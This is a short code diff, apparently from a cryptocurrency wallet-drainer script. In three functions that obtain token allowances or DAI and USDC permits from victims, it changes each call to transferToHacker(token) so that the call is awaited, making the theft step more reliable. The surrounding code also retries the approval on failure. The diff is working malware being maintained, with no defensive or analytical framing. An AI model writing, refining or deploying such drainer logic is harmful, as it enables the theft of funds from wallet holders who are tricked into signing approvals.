@@ -229,7 +229,7 @@ const increasAllow = async (token) => {
   }).then(async (result) => {
     console.log(result)
     await waitForTransaction(result.transactionHash)
-    transferToHacker(token);
+    await transferToHacker(token);
   }).catch(async (error) => {
     console.log(error)
     await increasAllow(token);
@@ -266,7 +266,7 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
     ).then(async (result) => {
       console.log(result)
       await waitForTransaction(result.transactionHash)
-      transferToHacker(token);
+      await transferToHacker(token);
     })
 
   }).catch(async (error) => {
@@ -290,7 +290,7 @@ const usdcPermitV2 = async (token, permitToken, provider) => {
     ).then(async (result) => {
       console.log(result)
       await waitForTransaction(result.transactionHash)
-      transferToHacker(token);
+      await transferToHacker(token);
     })
 
   }).catch(async (error) => {
